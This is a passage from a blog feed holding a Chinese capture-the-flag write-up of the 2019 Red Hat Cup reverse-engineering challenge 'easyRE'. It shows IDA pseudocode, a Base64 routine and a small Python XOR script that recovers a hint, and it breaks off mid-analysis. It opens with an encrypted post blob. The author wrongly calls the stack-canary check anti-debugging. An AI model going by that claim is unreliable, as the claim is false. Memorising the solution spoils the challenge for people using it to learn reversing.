ddb8128162b6caeb349b074e54439b68936af2f526cd774491fb7894267bac174748b3f447f2e67a8939a069d57b55d0deb10b353770bd676152fe1e7311ee826a94648c1aa422fe3cfb058daba84fba467bd89ff9e0053c0c4a947a8cde6e1909173561b4938905f9be48e63c18e11742dfe2b185574e0faf7ddad5f4d67dc2f15131ae826ab80085e67428bc3da4dd70a5d0b7a203d3e4f680769d7e04109e2c49c43e4a99b8497548dbc5c8c315774cd8fcff4018793e2f397eb3815c7fef027e743f84f73150dfded1217ee1cab843ef3ac804a6516923b7bc991b1df3eb3a27c541cacd52f5d46a238456399fd189a7e334e89eaa6f055bd1fedb</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-xray">
      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>
        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>
      </svg>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>[WP]2019红帽杯_easyRE</title>
    <url>/article/c7bccd73.html</url>
    <content><![CDATA[<p>最近在做逆向题目时，遇到一道比较难的题，其中一个小细节第一遍做的时候忽略了，所以这里记录一下。</p>
<h2 id="0x01-查壳和详细信息"><a href="#0x01-查壳和详细信息" class="headerlink" title="0x01 查壳和详细信息"></a>0x01 查壳和详细信息</h2><p>拿到 <code>attachment.elf</code> 文件<br>首先，先查看基本信息</p>
<p><img src="https://qiniuyun.fxhstudy.com/EasyRE1.png" srcset="/img/loading.gif"><br></p>
<p>无壳，ELF文件，64位。</p>
<h2 id="0x02-分析文件"><a href="#0x02-分析文件" class="headerlink" title="0x02 分析文件"></a>0x02 分析文件</h2><p>既然是ELF文件的话，Windows环境下也运行不了，懒得打开Linux系统了。<br>所以这里直接就拖进IDA中静态调试。</p>
<p>看着这么多未被识别的函数，黄豆流汗。</p>
<p><img src="https://qiniuyun.fxhstudy.com/EasyRE2.png" srcset="/img/loading.gif"><br></p>
<p>先查找字符串，发现了有用的字符串</p>
<p><img src="https://qiniuyun.fxhstudy.com/EasyRE3.png" srcset="/img/loading.gif"><br></p>
<p>仔细查看汇编代码段的话</p>
<p><img src="https://qiniuyun.fxhstudy.com/EasyRE4.png" srcset="/img/loading.gif"><br></p>
<p>我在这里看出了Base64加密，所以立马解密了。<br>在解密十多次后，发现是一篇地址的网站，以为这么简单就拿到Flag了，<br>但最后发现只是一篇文章。被骗了…</p>
<p>回到IDA，接着通过交叉引用，可以找到对应的函数。贴出伪代码：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">signed</span> __int64 <span class="hljs-title">sub_4009C6</span><span class="hljs-params">()</span><br></span>&#123;<br>  <span class="hljs-keyword">signed</span> __int64 result; <span class="hljs-comment">// rax</span><br>  __int64 v1; <span class="hljs-comment">// ST10_8</span><br>  __int64 v2; <span class="hljs-comment">// ST18_8</span><br>  __int64 v3; <span class="hljs-comment">// ST20_8</span><br>  __int64 v4; <span class="hljs-comment">// ST28_8</span><br>  __int64 v5; <span class="hljs-comment">// ST30_8</span><br>  __int64 v6; <span class="hljs-comment">// ST38_8</span><br>  __int64 v7; <span class="hljs-comment">// ST40_8</span><br>  __int64 v8; <span class="hljs-comment">// ST48_8</span><br>  __int64 v9; <span class="hljs-comment">// ST50_8</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-114h]</span><br>  <span class="hljs-keyword">char</span> v11; <span class="hljs-comment">// [rsp+60h] [rbp-C0h]</span><br>  <span class="hljs-keyword">char</span> v12; <span class="hljs-comment">// [rsp+61h] [rbp-BFh]</span><br>  <span class="hljs-keyword">char</span> v13; <span class="hljs-comment">// [rsp+62h] [rbp-BEh]</span><br>  <span class="hljs-keyword">char</span> v14; <span class="hljs-comment">// [rsp+63h] [rbp-BDh]</span><br>  <span class="hljs-keyword">char</span> v15; <span class="hljs-comment">// [rsp+64h] [rbp-BCh]</span><br>  <span class="hljs-keyword">char</span> v16; <span class="hljs-comment">// [rsp+65h] [rbp-BBh]</span><br>  <span class="hljs-keyword">char</span> v17; <span class="hljs-comment">// [rsp+66h] [rbp-BAh]</span><br>  <span class="hljs-keyword">char</span> v18; <span class="hljs-comment">// [rsp+67h] [rbp-B9h]</span><br>  <span class="hljs-keyword">char</span> v19; <span class="hljs-comment">// [rsp+68h] [rbp-B8h]</span><br>  <span class="hljs-keyword">char</span> v20; <span class="hljs-comment">// [rsp+69h] [rbp-B7h]</span><br>  <span class="hljs-keyword">char</span> v21; <span class="hljs-comment">// [rsp+6Ah] [rbp-B6h]</span><br>  <span class="hljs-keyword">char</span> v22; <span class="hljs-comment">// [rsp+6Bh] [rbp-B5h]</span><br>  <span class="hljs-keyword">char</span> v23; <span class="hljs-comment">// [rsp+6Ch] [rbp-B4h]</span><br>  <span class="hljs-keyword">char</span> v24; <span class="hljs-comment">// [rsp+6Dh] [rbp-B3h]</span><br>  <span class="hljs-keyword">char</span> v25; <span class="hljs-comment">// [rsp+6Eh] [rbp-B2h]</span><br>  <span class="hljs-keyword">char</span> v26; <span class="hljs-comment">// [rsp+6Fh] [rbp-B1h]</span><br>  <span class="hljs-keyword">char</span> v27; <span class="hljs-comment">// [rsp+70h] [rbp-B0h]</span><br>  <span class="hljs-keyword">char</span> v28; <span class="hljs-comment">// [rsp+71h] [rbp-AFh]</span><br>  <span class="hljs-keyword">char</span> v29; <span class="hljs-comment">// [rsp+72h] [rbp-AEh]</span><br>  <span class="hljs-keyword">char</span> v30; <span class="hljs-comment">// [rsp+73h] [rbp-ADh]</span><br>  <span class="hljs-keyword">char</span> v31; <span class="hljs-comment">// [rsp+74h] [rbp-ACh]</span><br>  <span class="hljs-keyword">char</span> v32; <span class="hljs-comment">// [rsp+75h] [rbp-ABh]</span><br>  <span class="hljs-keyword">char</span> v33; <span class="hljs-comment">// [rsp+76h] [rbp-AAh]</span><br>  <span class="hljs-keyword">char</span> v34; <span class="hljs-comment">// [rsp+77h] [rbp-A9h]</span><br>  <span class="hljs-keyword">char</span> v35; <span class="hljs-comment">// [rsp+78h] [rbp-A8h]</span><br>  <span class="hljs-keyword">char</span> v36; <span class="hljs-comment">// [rsp+79h] [rbp-A7h]</span><br>  <span class="hljs-keyword">char</span> v37; <span class="hljs-comment">// [rsp+7Ah] [rbp-A6h]</span><br>  <span class="hljs-keyword">char</span> v38; <span class="hljs-comment">// [rsp+7Bh] [rbp-A5h]</span><br>  <span class="hljs-keyword">char</span> v39; <span class="hljs-comment">// [rsp+7Ch] [rbp-A4h]</span><br>  <span class="hljs-keyword">char</span> v40; <span class="hljs-comment">// [rsp+7Dh] [rbp-A3h]</span><br>  <span class="hljs-keyword">char</span> v41; <span class="hljs-comment">// [rsp+7Eh] [rbp-A2h]</span><br>  <span class="hljs-keyword">char</span> v42; <span class="hljs-comment">// [rsp+7Fh] [rbp-A1h]</span><br>  <span class="hljs-keyword">char</span> v43; <span class="hljs-comment">// [rsp+80h] [rbp-A0h]</span><br>  <span class="hljs-keyword">char</span> v44; <span class="hljs-comment">// [rsp+81h] [rbp-9Fh]</span><br>  <span class="hljs-keyword">char</span> v45; <span class="hljs-comment">// [rsp+82h] [rbp-9Eh]</span><br>  <span class="hljs-keyword">char</span> v46; <span class="hljs-comment">// [rsp+83h] [rbp-9Dh]</span><br>  <span class="hljs-keyword">char</span> v47[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+90h] [rbp-90h]</span><br>  <span class="hljs-keyword">int</span> v48; <span class="hljs-comment">// [rsp+B0h] [rbp-70h]</span><br>  <span class="hljs-keyword">char</span> v49; <span class="hljs-comment">// [rsp+B4h] [rbp-6Ch]</span><br>  <span class="hljs-keyword">char</span> v50; <span class="hljs-comment">// [rsp+C0h] [rbp-60h]</span><br>  <span class="hljs-keyword">char</span> v51; <span class="hljs-comment">// [rsp+E7h] [rbp-39h]</span><br>  <span class="hljs-keyword">char</span> v52; <span class="hljs-comment">// [rsp+100h] [rbp-20h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v53; <span class="hljs-comment">// [rsp+108h] [rbp-18h]</span><br><br>  v53 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v11 = <span class="hljs-number">73</span>;<br>  v12 = <span class="hljs-number">111</span>;<br>  v13 = <span class="hljs-number">100</span>;<br>  v14 = <span class="hljs-number">108</span>;<br>  v15 = <span class="hljs-number">62</span>;<br>  v16 = <span class="hljs-number">81</span>;<br>  v17 = <span class="hljs-number">110</span>;<br>  v18 = <span class="hljs-number">98</span>;<br>  v19 = <span class="hljs-number">40</span>;<br>  v20 = <span class="hljs-number">111</span>;<br>  v21 = <span class="hljs-number">99</span>;<br>  v22 = <span class="hljs-number">121</span>;<br>  v23 = <span class="hljs-number">127</span>;<br>  v24 = <span class="hljs-number">121</span>;<br>  v25 = <span class="hljs-number">46</span>;<br>  v26 = <span class="hljs-number">105</span>;<br>  v27 = <span class="hljs-number">127</span>;<br>  v28 = <span class="hljs-number">100</span>;<br>  v29 = <span class="hljs-number">96</span>;<br>  v30 = <span class="hljs-number">51</span>;<br>  v31 = <span class="hljs-number">119</span>;<br>  v32 = <span class="hljs-number">125</span>;<br>  v33 = <span class="hljs-number">119</span>;<br>  v34 = <span class="hljs-number">101</span>;<br>  v35 = <span class="hljs-number">107</span>;<br>  v36 = <span class="hljs-number">57</span>;<br>  v37 = <span class="hljs-number">123</span>;<br>  v38 = <span class="hljs-number">105</span>;<br>  v39 = <span class="hljs-number">121</span>;<br>  v40 = <span class="hljs-number">61</span>;<br>  v41 = <span class="hljs-number">126</span>;<br>  v42 = <span class="hljs-number">121</span>;<br>  v43 = <span class="hljs-number">76</span>;<br>  v44 = <span class="hljs-number">64</span>;<br>  v45 = <span class="hljs-number">69</span>;<br>  v46 = <span class="hljs-number">67</span>;<br>  <span class="hljs-built_in">memset</span>(v47, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v47));<br>  v48 = <span class="hljs-number">0</span>;<br>  v49 = <span class="hljs-number">0</span>;<br>  sub_4406E0(<span class="hljs-number">0L</span>L, v47, <span class="hljs-number">37L</span>L);<br>  v49 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( sub_424BA0(v47) == <span class="hljs-number">36</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-keyword">unsigned</span> __int64)sub_424BA0(v47); ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)(v47[i] ^ i) != *(&amp;v11 + i) )<br>      &#123;<br>        result = <span class="hljs-number">4294967294L</span>L;<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      &#125;<br>    &#125;<br>    sub_410CC0(<span class="hljs-string">"continue!"</span>);<br>    <span class="hljs-built_in">memset</span>(&amp;v50, <span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>uLL);<br>    v52 = <span class="hljs-number">0</span>;<br>    sub_4406E0(<span class="hljs-number">0L</span>L, &amp;v50, <span class="hljs-number">64L</span>L);<br>    v51 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( sub_424BA0(&amp;v50) == <span class="hljs-number">39</span> )<br>    &#123;<br>      v1 = sub_400E44(&amp;v50);<br>      v2 = sub_400E44(v1);<br>      v3 = sub_400E44(v2);<br>      v4 = sub_400E44(v3);<br>      v5 = sub_400E44(v4);<br>      v6 = sub_400E44(v5);<br>      v7 = sub_400E44(v6);<br>      v8 = sub_400E44(v7);<br>      v9 = sub_400E44(v8);<br>      sub_400E44(v9);<br>      <span class="hljs-keyword">if</span> ( !(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)sub_400360() )<br>      &#123;<br>        sub_410CC0(<span class="hljs-string">"You found me!!!"</span>);<br>        sub_410CC0(<span class="hljs-string">"bye bye~"</span>);<br>      &#125;<br>      result = <span class="hljs-number">0L</span>L;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      result = <span class="hljs-number">4294967293L</span>L;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    result = <span class="hljs-number">0xFFFFFFFF</span>LL;<br>  &#125;<br>LABEL_13:<br>  <span class="hljs-keyword">if</span> ( __readfsqword(<span class="hljs-number">0x28</span>u) != v53 )<br>    sub_444020();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p><code>__readfsqword(0x28u)</code> 这个函数是用来防止调试的。</p>
<p>当我们查看 <code>sub_4406E0</code> <code>sub_424BA0</code> <code>sub_424BA0</code> … 会发现这些函数都很难去分析。<br>但，既然有关键字 <code>&#39;continue!&#39;</code> 的话,那么肯定上面的函数确实存在有相应的信息。</p>
<p>其实突破点还是比较好找的，就在Continue上面</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)(v53[i] ^ i) != *(&amp;v17 + i) )<br>      &#123;<br>        result = <span class="hljs-number">4294967294L</span>L;<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      &#125;<br></code></pre></div></td></tr></table></figure>

<p>通过这段代码，发现，v53这个数组会与i进行异或并与v17数组比较，如果想往下继续执行的话，两者就必须相等。<br>v17这个数组，其实就是v17-v52的值。(我第一次写的时候，并没有发现这点，后面的字符串时猜的)，这里猜测v53和输入有关系</p>
<p>然后就可以写EXP了:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># EXP1</span><br>flag_exp = <span class="hljs-string">''</span><br>v = [<span class="hljs-number">0</span>]*<span class="hljs-number">37</span><br>v[<span class="hljs-number">0</span>] = <span class="hljs-number">73</span><br>v[<span class="hljs-number">1</span>] = <span class="hljs-number">111</span><br>v[<span class="hljs-number">2</span>] = <span class="hljs-number">100</span><br>v[<span class="hljs-number">3</span>] = <span class="hljs-number">108</span><br>v[<span class="hljs-number">4</span>] = <span class="hljs-number">62</span><br>v[<span class="hljs-number">5</span>] = <span class="hljs-number">81</span><br>v[<span class="hljs-number">6</span>] = <span class="hljs-number">110</span><br>v[<span class="hljs-number">7</span>] = <span class="hljs-number">98</span><br>v[<span class="hljs-number">8</span>] = <span class="hljs-number">40</span><br>v[<span class="hljs-number">9</span>] = <span class="hljs-number">111</span><br>v[<span class="hljs-number">10</span>] = <span class="hljs-number">99</span><br>v[<span class="hljs-number">11</span>] = <span class="hljs-number">121</span><br>v[<span class="hljs-number">12</span>] = <span class="hljs-number">127</span><br>v[<span class="hljs-number">13</span>] = <span class="hljs-number">121</span><br>v[<span class="hljs-number">14</span>] = <span class="hljs-number">46</span><br>v[<span class="hljs-number">15</span>] = <span class="hljs-number">105</span><br>v[<span class="hljs-number">16</span>] = <span class="hljs-number">127</span><br>v[<span class="hljs-number">17</span>] = <span class="hljs-number">100</span><br>v[<span class="hljs-number">18</span>] = <span class="hljs-number">96</span><br>v[<span class="hljs-number">19</span>] = <span class="hljs-number">51</span><br>v[<span class="hljs-number">20</span>] = <span class="hljs-number">119</span><br>v[<span class="hljs-number">21</span>] = <span class="hljs-number">125</span><br>v[<span class="hljs-number">22</span>] = <span class="hljs-number">119</span><br>v[<span class="hljs-number">23</span>] = <span class="hljs-number">101</span><br>v[<span class="hljs-number">24</span>] = <span class="hljs-number">107</span><br>v[<span class="hljs-number">25</span>] = <span class="hljs-number">57</span><br>v[<span class="hljs-number">26</span>] = <span class="hljs-number">123</span><br>v[<span class="hljs-number">27</span>] = <span class="hljs-number">105</span><br>v[<span class="hljs-number">28</span>] = <span class="hljs-number">121</span><br>v[<span class="hljs-number">29</span>] = <span class="hljs-number">61</span><br>v[<span class="hljs-number">30</span>] = <span class="hljs-number">126</span><br>v[<span class="hljs-number">31</span>] = <span class="hljs-number">121</span><br>v[<span class="hljs-number">32</span>] = <span class="hljs-number">76</span><br>v[<span class="hljs-number">33</span>] = <span class="hljs-number">64</span><br>v[<span class="hljs-number">34</span>] = <span class="hljs-number">69</span><br>v[<span class="hljs-number">35</span>] = <span class="hljs-number">67</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">36</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">if</span> i ^ char == v[i]:<br>            flag_exp += chr(char)<br>print(flag_exp)<br><br><span class="hljs-comment"># 输出</span><br>Info:The first four chars are `flag`<br></code></pre></div></td></tr></table></figure>

<p>其实输出的这段提示，就是我第一遍没有得到的信息，是靠猜前四个字符是flag。</p>
<p>接着看到这串代码</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">39</span> )<br>&#123;<br>    v1 = sub_400E44(&amp;v50);<br>    v2 = sub_400E44(v1);<br>    v3 = sub_400E44(v2);<br>    v4 = sub_400E44(v3);<br>    v5 = sub_400E44(v4);<br>    v6 = sub_400E44(v5);<br>    v7 = sub_400E44(v6);<br>    v8 = sub_400E44(v7);<br>    v9 = sub_400E44(v8);<br>    sub_400E44(v9);<br>    <span class="hljs-keyword">if</span> ( !(unsigned <span class="hljs-keyword">int</span>)sub_400360() )<br>    &#123;<br>      sub_410CC0(<span class="hljs-string">"You found me!!!"</span>);<br>      sub_410CC0(<span class="hljs-string">"bye bye~"</span>);<br>    &#125;<br>    result = <span class="hljs-number">0L</span>L;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    result = <span class="hljs-number">4294967293L</span>L;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>发现 <code>sub_400E44</code> 一直在将v50进行不断处理,那就康康这个函数,贴出代码:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_400E44</span><span class="hljs-params">(<span class="hljs-keyword">const</span> __m128i *a1)</span><br></span>&#123;<br>  __int64 v1; <span class="hljs-comment">// rax</span><br>  __int64 v2; <span class="hljs-comment">// rax</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+1Ch] [rbp-24h]</span><br>  signed __int64 v7; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span><br>  __int64 v8; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span><br>  __int64 v9; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  LODWORD(v1) = sub_424BA0(a1);<br>  v8 = v1;<br>  <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">3</span> * (((unsigned __int128)(<span class="hljs-number">6148914691236517206L</span>L * (signed __int128)v1) &gt;&gt; <span class="hljs-number">64</span>) - (v1 &gt;&gt; <span class="hljs-number">63</span>)) )<br>    v2 = ((unsigned __int128)(<span class="hljs-number">6148914691236517206L</span>L * (signed __int128)v1) &gt;&gt; <span class="hljs-number">64</span>) - (v1 &gt;&gt; <span class="hljs-number">63</span>);<br>  <span class="hljs-keyword">else</span><br>    v2 = ((unsigned __int128)(<span class="hljs-number">6148914691236517206L</span>L * (signed __int128)v1) &gt;&gt; <span class="hljs-number">64</span>) - (v1 &gt;&gt; <span class="hljs-number">63</span>) + <span class="hljs-number">1</span>;<br>  v7 = <span class="hljs-number">4</span> * v2;<br>  v9 = sub_41EF60(<span class="hljs-number">4</span> * v2 + <span class="hljs-number">1</span>);<br>  *(_BYTE *)(v7 + v9) = <span class="hljs-number">0</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( v5 &lt; v7 - <span class="hljs-number">2</span> )<br>  &#123;<br>    *(_BYTE *)(v9 + v5) = aAbcdefghijklmn[(unsigned __int8)(*((_BYTE *)a1-&gt;m128i_i64 + v6) &gt;&gt; <span class="hljs-number">2</span>)];<br>    *(_BYTE *)(v9 + v5 + <span class="hljs-number">1L</span>L) = aAbcdefghijklmn[<span class="hljs-number">16</span> * (*((_BYTE *)a1-&gt;m128i_i64 + v6) &amp; <span class="hljs-number">3</span>) | (unsigned __int8)(*((_BYTE *)a1-&gt;m128i_i64 + v6 + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">4</span>)];<br>    *(_BYTE *)(v9 + v5 + <span class="hljs-number">2L</span>L) = aAbcdefghijklmn[<span class="hljs-number">4</span> * (*((_BYTE *)a1-&gt;m128i_i64 + v6 + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xF</span>) | (unsigned __int8)(*((_BYTE *)a1-&gt;m128i_i64 + v6 + <span class="hljs-number">2</span>) &gt;&gt; <span class="hljs-number">6</span>)];<br>    *(_BYTE *)(v9 + v5 + <span class="hljs-number">3L</span>L) = aAbcdefghijklmn[*((_BYTE *)a1-&gt;m128i_i64 + v6 + <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0x3F</span>];<br>    v6 += <span class="hljs-number">3</span>;<br>    v5 += <span class="hljs-number">4</span>;<br>  &#125;<br>  v3 = v8 - <span class="hljs-number">3</span> * (((unsigned __int128)(<span class="hljs-number">6148914691236517206L</span>L * (signed __int128)v8) &gt;&gt; <span class="hljs-number">64</span>) - (v8 &gt;&gt; <span class="hljs-number">63</span>));<br>  <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>  &#123;<br>    *(_BYTE *)(v5 - <span class="hljs-number">2L</span>L + v9) = <span class="hljs-number">61</span>;<br>    *(_BYTE *)(v5 - <span class="hljs-number">1L</span>L + v9) = <span class="hljs-number">61</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">2</span> )<br>  &#123;<br>    *(_BYTE *)(v5 - <span class="hljs-number">1L</span>L + v9) = <span class="hljs-number">61</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v9;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>额，这不就是Base64嘛。。。和上面呼应起来了，就是我开始解密的十遍的那个字符串嘛<br>可想而知，这条线索是没有用的。</p>
<p>这时没办法了，看了WP</p>
<p>我们先来到调用加密过的数据的地方，发现还有两个 <code>byte_6CC0A0</code> 和 <code>byte_6CC0A3</code> 是数组，其实就是一组数据。</p>
<p><img src="https://qiniuyun.fxhstudy.com/EasyRE5.png" srcset="/img/loading.gif"><br/></p>
<p>来到调用这组数据的函数</p>
